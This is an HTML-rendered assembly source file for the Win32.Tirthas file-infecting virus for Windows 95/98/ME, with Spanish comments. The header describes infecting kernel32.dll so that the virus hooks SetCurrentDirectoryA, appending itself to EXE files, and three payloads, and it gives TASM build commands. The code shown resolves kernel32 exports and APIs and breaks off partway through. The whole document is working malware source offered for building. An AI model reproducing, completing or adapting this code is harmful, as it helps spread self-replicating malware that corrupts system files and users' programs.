<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>wintirthas.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; WIN32.TIRTHAS - WRITTEN BY KENERMAM</span><span class="sc0">
</span><span class="sc1">; (c)2001-02 SPAIN.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; DESCRIPCION</span><span class="sc0">
</span><span class="sc1">; ===========</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;Especimen dise쨅do para WIN 95/98/ME que infecta el kernel32.dll creando</span><span class="sc0">
</span><span class="sc1">;una nueva seccion llamada .Tirthas. Los archivos los infecta aumentado</span><span class="sc0">
</span><span class="sc1">;la ultima seccion. Tiene tres payload quedando seleccionado uno en cada</span><span class="sc0">
</span><span class="sc1">;infeccion.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; FUNCIONAMIENTO</span><span class="sc0">
</span><span class="sc1">; ==============</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Los pasos del virus al ser ejecudado son:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 1 - Obtencion de la direccion base del KERNEL.</span><span class="sc0">
</span><span class="sc1">; 2 - Obtiene el ordinal de la funcion SetCurrentDirectoryA.</span><span class="sc0">
</span><span class="sc1">; 3 - Obtiene la direccion de la funcion GetProcAddress.</span><span class="sc0">
</span><span class="sc1">; 4 - Obtiene las direcciones de las funciones necesarias.</span><span class="sc0">
</span><span class="sc1">; 5 - Test de la fecha del sistema.</span><span class="sc0">
</span><span class="sc1">; 6 - Busqueda de archivos.</span><span class="sc0">
</span><span class="sc1">; 7 - Infeccion de archivos.</span><span class="sc0">
</span><span class="sc1">; 8 - Comprueba si el kernel esta infectado.</span><span class="sc0">
</span><span class="sc1">; 9 - Si el kernel no esta infectado:</span><span class="sc0">
</span><span class="sc1">;     10 - Busca el directorio WINDOWS y SYSTEM.</span><span class="sc0">
</span><span class="sc1">;     11 - Comprueba si existe KERNEL32.DL_ si no esta lo crea.</span><span class="sc0">
</span><span class="sc1">;     12 - Modifica kernel32.dl_</span><span class="sc0">
</span><span class="sc1">;     13 - Crea WINSYSTEM.KER</span><span class="sc0">
</span><span class="sc1">;     14 - Crea WININIT.INI</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; DETALLES</span><span class="sc0">
</span><span class="sc1">; ========</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;La infeccion de archivos se realiza mediante el aumento de la ultima seccion</span><span class="sc0">
</span><span class="sc1">;del archivo.</span><span class="sc0">
</span><span class="sc1">;La infeccion del kernel se realiza mediante la modificacion del archivo</span><span class="sc0">
</span><span class="sc1">;WININIT.EXE el cual es cargado antes que el kernel y por tanto se puede</span><span class="sc0">
</span><span class="sc1">;cambiar el mismo desde esta situacion. El cambio del kernel32 se realiza</span><span class="sc0">
</span><span class="sc1">;sustituyendo el archivo KERNEL32.DLL por el kernel modificado por el virus</span><span class="sc0">
</span><span class="sc1">;situado en un archivo llamado KERNEL32.DL_.Este nuevo nucleo tiene</span><span class="sc0">
</span><span class="sc1">;interceptada la funcion SetCurrentDirectoryA. Cuando desde un sistema</span><span class="sc0">
</span><span class="sc1">;infectado es llamada esta funcion (cualquier programa llama a esta funcion</span><span class="sc0">
</span><span class="sc1">;cuando pulsas sobre una carpeta o escribes un directorio) el virus busca en</span><span class="sc0">
</span><span class="sc1">;el directorio los archivos EXE existentes y los infecta.</span><span class="sc0">
</span><span class="sc1">;Para infectar kernel32.dl_ (copia de kernel32.dll) busca la ultima seccion</span><span class="sc0">
</span><span class="sc1">;y tras esta crea una nueva seccion llamada .Tirthas en la cual se introduce</span><span class="sc0">
</span><span class="sc1">;el virus. Despues de esto comienza la busqueda de la seccion de</span><span class="sc0">
</span><span class="sc1">;exportaciones para cambiar la RVA de la funcion SetCurrentDirectoryA por</span><span class="sc0">
</span><span class="sc1">;otra que apunta a la funcion SetCurrentDirectoryA del virus. Cuando</span><span class="sc0">
</span><span class="sc1">;cualquier proceso llama a esta funcion el virus comienza a actuar buscando e</span><span class="sc0">
</span><span class="sc1">;infectando los archivos existentes de la carpeta seleccionada</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; PAYLOAD</span><span class="sc0">
</span><span class="sc1">; =======</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Tirthas cuenta con tres payload, de los cuales solo se activara uno en cada</span><span class="sc0">
</span><span class="sc1">;archivo infectado.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  1 - Payload: Muestra un mensaje de texto:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;           旼컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴커   </span><span class="sc0">
</span><span class="sc1">;           쿥IN32.TIRTHAS WRITTEN BY KENERMAM. (c)2001-02 SPAIN </span><span class="sc0">
</span><span class="sc1">;           쳐컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴캑   </span><span class="sc0">
</span><span class="sc1">;            KENERMAM MESSAGE:                                  </span><span class="sc0">
</span><span class="sc1">;                                                               </span><span class="sc0">
</span><span class="sc1">;            YOU ARE FOUL.                                      </span><span class="sc0">
</span><span class="sc1">;            THIS IS INFECTION OF TIRTHAS.                      </span><span class="sc0">
</span><span class="sc1">;           읕컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴켸</span><span class="sc0">
</span><span class="sc1">;         </span><span class="sc0">
</span><span class="sc1">;  2 - Payload: Rellena la parate izquierda de la pantalla de windows con el</span><span class="sc0">
</span><span class="sc1">;               texto YOU ARE FOUL.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  3 - Payload: Cambia los atributos de accesibilidad de windows.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; FICHA</span><span class="sc0">
</span><span class="sc1">; =====</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Nombre:                 WIN32.TIRTHAS</span><span class="sc0">
</span><span class="sc1">; Autor:                  KENERMAM</span><span class="sc0">
</span><span class="sc1">; Origen:                 ESPA쩇</span><span class="sc0">
</span><span class="sc1">; Plataforma:             WIN 95/98/ME</span><span class="sc0">
</span><span class="sc1">; Tama쨚:                 12288 bytes</span><span class="sc0">
</span><span class="sc1">; Objetivos:              ARCHIVOS EXE</span><span class="sc0">
</span><span class="sc1">; Residencia en memoria:  INFECTA EL ARCHIVO KERNEL32.DLL E INTERCEPTA LA </span><span class="sc0">
</span><span class="sc1">;                         FUNCION SetCurrentDirecoryA</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; COMPILACION</span><span class="sc0">
</span><span class="sc1">; ===========</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Tasm32 /ml /m5 WIN32TIRTHAS.ASM</span><span class="sc0">
</span><span class="sc1">; Tlink32 -Tpe -x -aa WIN32TIRTHAS,,, IMPORT32</span><span class="sc0">
</span><span class="sc1">; Pewrsec WIN32TIRTHAS.EXE</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;==================================TIRTHAS===================================</span><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">

      </span><span class="sc2">.386p</span><span class="sc0">
      </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

      </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

      </span><span class="sc9">.data</span><span class="sc0">

       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WIN32.TIRTHAS'</span><span class="sc0">
                              
      </span><span class="sc9">.code</span><span class="sc0">                                        
</span><span class="sc5">Tirthas_start</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">Tirthas</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeltaOffset</span><span class="sc0">

</span><span class="sc5">DeltaOffset</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DeltaOffset</span><span class="sc0">          

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">;Obtencion de la direccion base del Kernel32 para, posteriormente,</span><span class="sc0">
      </span><span class="sc1">;calcular la direccion de GetProcAddress.</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Old_SEH</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">My_SEH</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ffff0000h</span><span class="sc0">
      
</span><span class="sc5">Find_baseK</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10000h</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Put_old_SEH</span><span class="sc0">                              

</span><span class="sc5">My_SEH</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Find_baseK</span><span class="sc0"> 
     
</span><span class="sc5">Put_old_SEH</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Old_SEH</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">Search_info</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Base_kernel</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_kernel32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                                  </span><span class="sc1">;EDI= cabecera real del PE.</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Base_kernel</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_export_table</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;tabla de exportaciones.</span><span class="sc0">

      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                                   </span><span class="sc1">;contador.</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Base_kernel</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">Find_fuction</span><span class="sc4">:</span><span class="sc0">
      
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Base_kernel</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">comparativa</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_funciones</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA_F</span><span class="sc0">

 </span><span class="sc5">GetProcAddress_F</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">T_GetProcAddress</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">More_rva</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Resultado</span><span class="sc0">

 </span><span class="sc5">SetCurrentDirectoryA_F</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">T_SetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">More_rva</span><span class="sc0">

   </span><span class="sc5">Resultado</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_funciones</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Max_SetCurrentDirectoryA</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Fuction_ok</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">comparativa</span><span class="sc0">

 </span><span class="sc5">Max_SetCurrentDirectoryA</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Fuction_ok</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">comparativa</span><span class="sc0">

 </span><span class="sc5">More_rva</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Find_fuction</span><span class="sc0">

 </span><span class="sc5">Fuction_ok</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">      
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_export_table</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">             
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Base_kernel</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; GUARDAMOS LOS ORDINALES DE LAS FUNCIONES</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_funciones</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Get_RVA</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Ordinal_funcion_1</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">


 </span><span class="sc5">Get_RVA</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_export_table</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Base_kernel</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                                     
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_funciones</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Save_GetProcAddress</span><span class="sc0">

      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_funciones</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Base_kernel</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Search_info</span><span class="sc0">

 </span><span class="sc5">Save_GetProcAddress</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_funciones</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Base_kernel</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_GetProcAddress</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">;BUSQUEDA DE DIRECCIONES </span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_list_1</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Fuction_list_1</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Get_Address_1</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">File_ADVAPI32</span><span class="sc4">]</span><span class="sc0">              
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_LoadLibraryA</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Base_kernel</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_list_2</span><span class="sc4">]</span><span class="sc0">
